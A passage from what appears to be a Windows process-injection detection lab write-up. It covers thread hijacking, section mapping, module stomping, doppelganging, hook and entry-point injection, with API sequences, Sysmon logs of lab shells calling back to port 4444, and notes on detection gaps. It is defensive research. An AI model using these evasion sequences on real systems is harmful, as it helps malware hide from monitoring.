| 4    | DLL bytes written to remote memory       | -          | -                        |
| 5    | CreateRemoteThread(ReflectiveLoader)     | EID 8      | T1055 Process Injection  |
| 6    | ReflectiveLoader self-maps DLL           | -          | -                        |

### Key Indicators
- **EID 8** `StartModule: -` thread starts from anonymous memory.
  ReflectiveLoader address is in RWX allocated memory not a named
  module. Identical fingerprint to T1/T2/T5 shellcode injection.
- **EID 7 absent** confirmed detection gap. Reflective loading
  bypasses Windows loader entirely.
- **EID 10** `GrantedAccess: 0x1410`  VM_WRITE+VM_READ+VM_OP+QUERY.
  Metasploit uses minimal rights for initial reconnaissance handle.
- **EID 10** `GrantedAccess: 0x3fff` — elevated rights for injection
  handle. New value not previously seen in lab.
- **EID 10** `UNKNOWN(0000000000CBDDFC)` Meterpreter shellcode
  executing from anonymous memory making API calls.
- **EID 10** svchost.exe targeted by Meterpreter for process enumeration. 


## T8. Thread Hijacking
Suspends an existing thread in the target process, modifies its instruction pointer to point at shellcode, then resumes it. No new thread is created the existing thread is redirected. 
| API Call              | Layer | Sysmon Event |
|-----------------------|-------|--------------|
| OpenProcess()         | Win32 | EID 10       |
| VirtualAllocEx()      | Win32 | —            |
| WriteProcessMemory()  | Win32 | —            |
| OpenThread()          | Win32 | —            |
| SuspendThread()       | Win32 | —            |
| GetThreadContext()    | Win32 | —            |
| SetThreadContext()    | Win32 | —            |
| ResumeThread()        | Win32 | —            |

### Sysmon Data
1. "Process accessed:
RuleName: -
UtcTime: 2026-05-18 13:02:21.789
SourceProcessGUID: {ED9BFE1B-0DDD-6A0B-7B02-000000001400}
SourceProcessId: 7992
SourceThreadId: 2332
SourceImage: C:\Users\jens\Documents\procInj\t8_thread_hijacking.exe
TargetProcessGUID: {ED9BFE1B-0C95-6A0B-7302-000000001400}
TargetProcessId: 6708
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x1428
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+162164|C:\WINDOWS\System32\KERNELBASE.dll+360c6|C:\Users\jens\Documents\procInj\t8_thread_hijacking.exe+160b|C:\Users\jens\Documents\procInj\t8_thread_hijacking.exe+10d9|C:\Users\jens\Documents\procInj\t8_thread_hijacking.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-18 13:02:51.242
ProcessGuid: {ED9BFE1B-0DFB-6A0B-7C02-000000001400}
ProcessId: 2860
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8328 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\
User: WIN11\jens
LogonGuid: {ED9BFE1B-F575-6A0A-846C-0C0000000000}
LogonId: 0xc6c84
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=8EFFECCD068002141AEF22B095A52E1D41656C98,MD5=CED4AA0B4CBF72E2520E0A2CCFF79370,SHA256=D5697FEF6995E992B9232A2B19665A297743427316C7225A5B772F0032F20FCA,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-0C95-6A0B-7302-000000001400}
ParentProcessId: 6708
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" RestartByRestartManager:* 
ParentUser: WIN11\jens"

3. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-18 13:02:51.251
SourceProcessGUID: {ED9BFE1B-0C95-6A0B-7302-000000001400}
SourceProcessId: 6708
SourceThreadId: 7516
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-0DFB-6A0B-7C02-000000001400}
TargetProcessId: 2860
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+1636b4|C:\WINDOWS\System32\KERNELBASE.dll+8b82d|C:\WINDOWS\System32\KERNELBASE.dll+88d43|C:\WINDOWS\System32\KERNELBASE.dll+888a6|C:\WINDOWS\System32\KERNEL32.DLL+44f14|UNKNOWN(000001FBB4BC01BC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

4. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-18 13:02:58.388
ProcessGuid: {ED9BFE1B-0C95-6A0B-7302-000000001400}
ProcessId: 6708
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.12
SourceHostname: -
SourcePort: 61652
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"

### Sysmon Analysis
EID 8 completely absent, confirmed detection gap for thread hijacking as no thread is created so PsSetCreateThreadNotifyRoutine never fires. EID 10 shows GrantedAccess 0x1428 notably missing PROCESS_CREATE_THREAD (0x0002) compared to T1-T6. This can be used as forensic signature of thread hijacking vs thread creation injection. Will need to add 0x1428 to the sysmon config. 30 second gap between injection and shell spawn. Thread hijacking disrupts the target thread, notepad may have been in a wait state when hijacked causing delayed execution. Normal behavior for thread hijacking depending on which thread is targeted.

| Step | Action                                  | Sysmon EID | Rule Triggered          |
|------|-----------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad        | EID 10     | New rule name needed    |
| 2    | Shellcode written to remote memory      | -          | -                       |
| 3    | Target thread suspended                 | -          | -                       |
| 4    | Thread context redirected to shellcode  | -          | -                       |
| 5    | Thread resumed — executes shellcode     | -          | -                       |
| 6    | Shellcode opens handle to cmd.exe       | EID 10     | ProcessInjectionDelux   |

### Key Indicators
- **EID 8 absent** confirmed gap. No thread created so kernel
  callback never fires. Cannot detect thread hijacking via EID 8.
- **EID 10** `GrantedAccess: 0x1428` missing PROCESS_CREATE_THREAD
  (0x0002). Forensic signature distinguishing hijacking from thread
  creation injection.
- **EID 10** `CallTrace: t8_thread_hijacking.exe+160b` clean chain
  through ntdll and KERNELBASE into injector binary.
- **EID 10** `UNKNOWN(000001FBB4BC01BC)` shellcode executing from
  anonymous memory.


## T9. NtCreateSection + NtMapViewOfSection injection
Creates a shared memory section between the injector and target process, writes shellcode into it, then maps it into the target's address space. The key difference from all previous techniques is that VirtualAllocEx and WriteProcessMemory are never called instead memory is shared via section objects.
| API Call                   | Layer      | Sysmon Event |
|----------------------------|------------|--------------|
| OpenProcess()              | Win32      | EID 10       |
| NtCreateSection()          | Native API | -            |
| NtMapViewOfSection(local)  | Native API | -            |
| memcpy(shellcode)          | C runtime  | -            |
| NtMapViewOfSection(remote) | Native API | -            |
| NtCreateThreadEx()         | Native API | EID 8        |

### Sysmon Data
1. "Process accessed:
RuleName: -
UtcTime: 2026-05-18 13:58:54.691
SourceProcessGUID: {ED9BFE1B-1B1E-6A0B-F002-000000001400}
SourceProcessId: 2884
SourceThreadId: 4616
SourceImage: C:\Users\jens\Documents\procInj\t9_ntcreatesection.exe
TargetProcessGUID: {ED9BFE1B-1B07-6A0B-EF02-000000001400}
TargetProcessId: 13976
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x140a
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+162164|C:\WINDOWS\System32\KERNELBASE.dll+360c6|C:\Users\jens\Documents\procInj\t9_ntcreatesection.exe+16b7|C:\Users\jens\Documents\procInj\t9_ntcreatesection.exe+10d9|C:\Users\jens\Documents\procInj\t9_ntcreatesection.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-18 13:58:54.723
SourceProcessGuid: {ED9BFE1B-1B1E-6A0B-F002-000000001400}
SourceProcessId: 2884
SourceImage: C:\Users\jens\Documents\procInj\t9_ntcreatesection.exe
TargetProcessGuid: {ED9BFE1B-1B07-6A0B-EF02-000000001400}
TargetProcessId: 13976
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 7136
StartAddress: 0x00000298DA830000
StartModule: -
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

3.  "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-18 13:58:54.862
ProcessGuid: {ED9BFE1B-1B1E-6A0B-F102-000000001400}
ProcessId: 10020
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8328 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\
User: WIN11\jens
LogonGuid: {ED9BFE1B-F575-6A0A-846C-0C0000000000}
LogonId: 0xc6c84
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=8EFFECCD068002141AEF22B095A52E1D41656C98,MD5=CED4AA0B4CBF72E2520E0A2CCFF79370,SHA256=D5697FEF6995E992B9232A2B19665A297743427316C7225A5B772F0032F20FCA,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-1B07-6A0B-EF02-000000001400}
ParentProcessId: 13976
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" 
ParentUser: WIN11\jens"

4. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-18 13:58:54.869
SourceProcessGUID: {ED9BFE1B-1B07-6A0B-EF02-000000001400}
SourceProcessId: 13976
SourceThreadId: 7136
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-1B1E-6A0B-F102-000000001400}
TargetProcessId: 10020
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+1636b4|C:\WINDOWS\System32\KERNELBASE.dll+8b82d|C:\WINDOWS\System32\KERNELBASE.dll+88d43|C:\WINDOWS\System32\KERNELBASE.dll+888a6|C:\WINDOWS\System32\KERNEL32.DLL+44f14|UNKNOWN(00000298DA8301BC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

5. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-18 13:58:45.382
ProcessGuid: {ED9BFE1B-1B07-6A0B-EF02-000000001400}
ProcessId: 13976
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.12
SourceHostname: -
SourcePort: 49923
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"


### Sysmon Analysis
First got error 0xC0000022 which STATUS_ACCESS_DENIED on NtCreateThreadEx. The issue was the process handle was opened without PROCESS_CREATE_THREAD rights which was needed from initial testing. EID 8 fired confirming NtCreateThreadEx still generates kernel thread creation callback regardless of how memory was shared. EID 10 shows GrantedAccess 0x140a, lowest process access mask seen in lab so far. No PROCESS_VM_WRITE (0x0020) present confirming WriteProcessMemory was never called. Section-based
injection requires fewer process rights than any previous technique because memory sharing bypasses direct VM read/write operations.

| Step | Action                                    | Sysmon EID | Rule Triggered          |
|------|-------------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad          | EID 10     | New rule name needed    |
| 2    | NtCreateSection creates shared section    | -          | -                       |
| 3    | Section mapped locally — shellcode copied | -          | -                       |
| 4    | Section mapped into remote process        | -          | -                       |
| 5    | NtCreateThreadEx creates remote thread    | EID 8      | T1055 Process Injection |
| 6    | Shellcode opens handle to cmd.exe         | EID 10     | ProcessInjectionDelux   |

### Key Indicators
- **EID 8** `StartModule: -` section mapped memory appears as
  anonymous same fingerprint as shellcode in VirtualAllocEx
  memory.
- **EID 10** `GrantedAccess: 0x140a` lowest process mask in lab.
  No PROCESS_VM_WRITE (0x0020) confirms WriteProcessMemory absent.
  Forensic signature of section-based injection.
- **EID 10** `UNKNOWN(00000298DA8301BC)` shellcode executing from anonymous memory.


## T10. Module Stomping
Overwrites an already loaded legitimate DLLs memory in the target process with shellcode. Instead of allocating new anonymous RWX memory, shellcode lives inside a named legitimate module. This evades detections based on anonymous memory allocation and changes the EID 8 StartModule from "-" to a legitimate DLL name.
| API Call                  | Layer | Sysmon Event          |
|---------------------------|-------|-----------------------|
| OpenProcess()             | Win32 | EID 10                |
| VirtualAllocEx()          | Win32 | -                     |
| WriteProcessMemory(path)  | Win32 | -                     |
| CreateRemoteThread(LoadLibraryW) | Win32 | EID 8 (step 1) |
| LoadLibraryW(amsi.dll)    | Win32 | EID 7                 |
| WriteProcessMemory(shellcode) | Win32 | EID 25            |
| CreateRemoteThread(entrypoint) | Win32 | EID 8 (step 2)   |

### Sysmon Data
1. "Process accessed:
RuleName: -
UtcTime: 2026-05-25 12:12:12.213
SourceProcessGUID: {ED9BFE1B-3C9C-6A14-E303-000000001600}
SourceProcessId: 4516
SourceThreadId: 12696
SourceImage: C:\Users\jens\Documents\procInj\t10_module_stomping.exe
TargetProcessGUID: {ED9BFE1B-3C92-6A14-E203-000000001600}
TargetProcessId: 8000
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x143a
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+162164|C:\WINDOWS\System32\KERNELBASE.dll+360c6|C:\Users\jens\Documents\procInj\t10_module_stomping.exe+1611|C:\Users\jens\Documents\procInj\t10_module_stomping.exe+10d9|C:\Users\jens\Documents\procInj\t10_module_stomping.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-25 12:12:12.213
SourceProcessGuid: {ED9BFE1B-3C9C-6A14-E303-000000001600}
SourceProcessId: 4516
SourceImage: C:\Users\jens\Documents\procInj\t10_module_stomping.exe
TargetProcessGuid: {ED9BFE1B-3C92-6A14-E203-000000001600}
TargetProcessId: 8000
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 1672
StartAddress: 0x00007FF8806DF710
StartModule: C:\WINDOWS\System32\KERNEL32.DLL
StartFunction: LoadLibraryW
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

3. "Image loaded:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2026-05-25 12:12:12.216
ProcessGuid: {ED9BFE1B-3C92-6A14-E203-000000001600}
ProcessId: 8000
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ImageLoaded: C:\Windows\System32\amsi.dll
FileVersion: 10.0.26100.7309 (WinBuild.160101.0800)
Description: Anti-Malware Scan Interface
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: amsi.dll
Hashes: SHA1=4C6F8D7A04EE5A9177475708929C71863BCB3F54,MD5=C197ACDDB6CCFAFBA5E9446722403DDD,SHA256=9DF7AD9E6826AB76294A91BEF274696EE13D18A8CEBABCD5C4C352A3D1141DF3,IMPHASH=2113D3CE4C8FBF73EBAC7ABC70D78752
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: WIN11\jens"

4. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-25 12:12:12.229
SourceProcessGuid: {ED9BFE1B-3C9C-6A14-E303-000000001600}
SourceProcessId: 4516
SourceImage: C:\Users\jens\Documents\procInj\t10_module_stomping.exe
TargetProcessGuid: {ED9BFE1B-3C92-6A14-E203-000000001600}
TargetProcessId: 8000
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 14240
StartAddress: 0x00007FF85B2694D0
StartModule: C:\windows\system32\amsi.dll
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

### Sysmon Analysis
Two EID 8 events fired, one for the LoadLibraryW step and one for the shellcode execution step. EID 7 confirmed amsi.dll loaded into
notepad but EID 25 is absent as Sysmon did not detect the image modification. The shellcode execution thread shows StartModule: amsi.dll but with empty StartFunction: "-".

| Step | Action                                    | Sysmon EID | Rule Triggered          |
|------|-------------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad          | EID 10     | — needs rule name       |
| 2    | amsi.dll path written to remote memory    | -          | -                       |
| 3    | CreateRemoteThread(LoadLibraryW)          | EID 8      | T1055 Process Injection |
| 4    | amsi.dll loaded into notepad              | EID 7      | T1059.001 PowerShell    |
| 5    | Shellcode written to amsi.dll entry point | -          | -                       |
| 6    | CreateRemoteThread(amsi entry point)      | EID 8      | T1055 Process Injection |

### Key Indicators
- **EID 8 step 1** `StartFunction: LoadLibraryW` DLL load step visible. Confirms amsi.dll was loaded via remote thread.
- **EID 8 step 2** `StartModule: amsi.dll` shellcode execution thread starts from named legitimate module. Detection rules relying on StartModule: "-" miss this entirely.
- **EID 8 step 2** `StartFunction: -` no named function at entry point because shellcode overwrote it. Named module but no function name is a stomping indicator.
- **EID 7** `ImageLoaded: amsi.dll` `Signed: true` legitimate signed DLL loaded into notepad.
- **EID 10** `GrantedAccess: 0x1fffff` — full access requested.
  RuleName: - means rule match but no name — config needs update.
- **EID 25 absent** Sysmon did not detect image modification. WriteProcessMemory to existing mapped module may not trigger PsSetCreateProcessNotifyRoutineEx in all cases.


## T.11 Process Doppelganging
Process Doppelganging abuses Windows Transactional NTFS (TxF) to load a malicious process image that appears legitimate to security tools. It creates a file transaction, writes a malicious PE to a transacted file, creates a process from that transacted file, then rolls back the transaction. The malicious file never actually exists on disk, it is only visible inside the transaction. 

### Sysmon Data
`----`
### Sysmon Analysis
NtCreateProcessEx returns 0xC00000BB (STATUS_NOT_SUPPORTED) on Windows 11. Microsoft patched the TxF-based process creation path that doppelganging relies on. The technique is effectively dead on modern Windows builds.
<img width="562" height="211" alt="image" src="https://github.com/user-attachments/assets/f0cf3c78-2836-40a4-a119-7b2de0228d60" />


## T.12 SetWindowsHookEx
Installs a Windows message hook that causes the OS to automatically load a DLL into any process that handles the hooked message type. No CreateRemoteThread called, instead Windows itself performs the injection when a hooked event fires. The DLL is loaded into every process receiving the hooked message.
| API Call              | Layer | Sysmon Event              |
|-----------------------|-------|---------------------------|
| LoadLibraryA()        | Win32 | EID 7 (local load)        |
| SetWindowsHookEx()    | Win32 | -                         |
| Windows message loop  | OS    | EID 7 (remote processes)  |
| spotlessExport()      | DLL   | - (callback)              |
| VirtualAlloc()        | Win32 | -                         |

### Sysmon Data
1. "Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2026-05-25 14:15:45.667
ProcessGuid: {ED9BFE1B-5991-6A14-7505-000000001600}
ProcessId: 9724
Image: C:\Users\jens\Documents\procInj\t12_setwindowshookex.exe
ImageLoaded: C:\Users\jens\Documents\procInj\t12_dllhook.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA1=9915575BD7CBA9BC1A47A55ACF19B229C805D7C7,MD5=DB809B9DE01DD19B447F9EC8C32EC177,SHA256=3926442C83C96B1FC11FDAA7032D3F60E4E83A2B6D91B3912AA7F604CE9C9AD6,IMPHASH=EF1DA18B1960BF7711AECD9BD3344EC5
Signed: false
Signature: -
SignatureStatus: Unavailable
User: WIN11\jens"

2. "Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2026-05-25 14:15:45.747
ProcessGuid: {ED9BFE1B-5920-6A14-6A05-000000001600}
ProcessId: 9804
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11321.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\Users\jens\Documents\procInj\t12_dllhook.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA1=9915575BD7CBA9BC1A47A55ACF19B229C805D7C7,MD5=DB809B9DE01DD19B447F9EC8C32EC177,SHA256=3926442C83C96B1FC11FDAA7032D3F60E4E83A2B6D91B3912AA7F604CE9C9AD6,IMPHASH=EF1DA18B1960BF7711AECD9BD3344EC5
Signed: false
Signature: -
SignatureStatus: Unavailable
User: WIN11\jens"

3. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-25 14:15:45.767
ProcessGuid: {ED9BFE1B-5991-6A14-7605-000000001600}
ProcessId: 1456
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8328 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\WINDOWS\system32\
User: WIN11\jens
LogonGuid: {ED9BFE1B-066F-6A14-3A1C-070000000000}
LogonId: 0x71c3a
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=8EFFECCD068002141AEF22B095A52E1D41656C98,MD5=CED4AA0B4CBF72E2520E0A2CCFF79370,SHA256=D5697FEF6995E992B9232A2B19665A297743427316C7225A5B772F0032F20FCA,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-5920-6A14-6A05-000000001600}
ParentProcessId: 9804
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11321.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11321.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding
ParentUser: WIN11\jens"

4. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-25 14:15:44.451
ProcessGuid: {ED9BFE1B-5920-6A14-6A05-000000001600}
ProcessId: 9804
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11321.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.13
SourceHostname: -
SourcePort: 51337
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"

### Sysmon Analysis
EID 8 is completely absent as SetWindowsHookEx does not create a remote thread instead Windows message dispatcher loads the DLL automatically. Also EID 10 is absent because SetWindowsHookEx does not call OpenProcess at any point. EID 7 fired in two processes simultaneously, the injector itself and WindowsTerminal.exe. The hook injected into WindowsTerminal because it was the active keyboard focus process when the key was pressed, not notepad. It was also confired with cmd.exe crashing.
| Step | Action                                    | Sysmon EID | Rule Triggered          |
|------|-------------------------------------------|------------|-------------------------|
| 1    | LoadLibrary loads DLL locally             | EID 7      | T1574.002 DLL Side-Load |
| 2    | SetWindowsHookEx installs system-wide hook| -          | -                       |
| 3    | Key pressed — Windows loads DLL into target| EID 7     | T1574.002 DLL Side-Load |
| 4    | DLL callback executes shellcode           | -          | -                       |
| 5    | WindowsTerminal spawns cmd.exe            | EID 1      | T1059.003 Cmd Shell     |

### Key Indicators
- **EID 8/10 absent** which confirmed gap, Windows message dispatcher performs the load internally.
- **EID 7** `ImageLoaded: t12_dllhook.dll` in MULTIPLE processes same DLL hash appearing across different processes simultaneously is the key detection indicator for hook injection.


## T13. AddressOfEntryPoint without VirtualAllocEx RWX
Injects shellcode into a target process without allocating anonymous RWX memory. Instead of VirtualAllocEx, the existing PE entry point memory protection is changed with VirtualProtectEx and shellcode is written directly into the process image. Shellcode executes from within the named process binary and not anonymous memory.
| API Call                | Layer      | Sysmon Event |
|-------------------------|------------|--------------|
| OpenProcess()           | Win32      | EID 10       |
| NtQueryInformationProcess| Native API | -           |
| ReadProcessMemory()     | Win32      | -            |
| VirtualProtectEx()      | Win32      | -            |
| WriteProcessMemory()    | Win32      | -            |
| CreateRemoteThread()    | Win32      | EID 8        |

### Sysmon Data
1. "Process accessed:
RuleName: -
UtcTime: 2026-05-26 07:36:33.249
SourceProcessGUID: {ED9BFE1B-4D81-6A15-E901-000000001700}
SourceProcessId: 5132
SourceThreadId: 9988
SourceImage: C:\Users\jens\Documents\procInj\t13_aoe_injection.exe
TargetProcessGUID: {ED9BFE1B-4A3A-6A15-C801-000000001700}
TargetProcessId: 12916
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x143a
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+162164|C:\WINDOWS\System32\KERNELBASE.dll+360c6|C:\Users\jens\Documents\procInj\t13_aoe_injection.exe+1611|C:\Users\jens\Documents\procInj\t13_aoe_injection.exe+10d9|C:\Users\jens\Documents\procInj\t13_aoe_injection.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-26 07:36:33.265
SourceProcessGuid: {ED9BFE1B-4D81-6A15-E901-000000001700}
SourceProcessId: 5132
SourceImage: C:\Users\jens\Documents\procInj\t13_aoe_injection.exe
TargetProcessGuid: {ED9BFE1B-4A3A-6A15-C801-000000001700}
TargetProcessId: 12916
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 12712
StartAddress: 0x00007FF712BA2230
StartModule: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

3. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-26 07:36:33.405
ProcessGuid: {ED9BFE1B-4D81-6A15-EA01-000000001700}
ProcessId: 6820
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8328 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\
User: WIN11\jens
LogonGuid: {ED9BFE1B-41F0-6A15-0AE7-060000000000}
LogonId: 0x6e70a
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=8EFFECCD068002141AEF22B095A52E1D41656C98,MD5=CED4AA0B4CBF72E2520E0A2CCFF79370,SHA256=D5697FEF6995E992B9232A2B19665A297743427316C7225A5B772F0032F20FCA,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-4A3A-6A15-C801-000000001700}
ParentProcessId: 12916
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" RestartByRestartManager:* 
ParentUser: WIN11\jens"

4. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
UtcTime: 2026-05-26 07:36:33.432
SourceProcessGUID: {ED9BFE1B-4A3A-6A15-C801-000000001700}
SourceProcessId: 12916
SourceThreadId: 12712
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-4D81-6A15-EA01-000000001700}
TargetProcessId: 6820
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
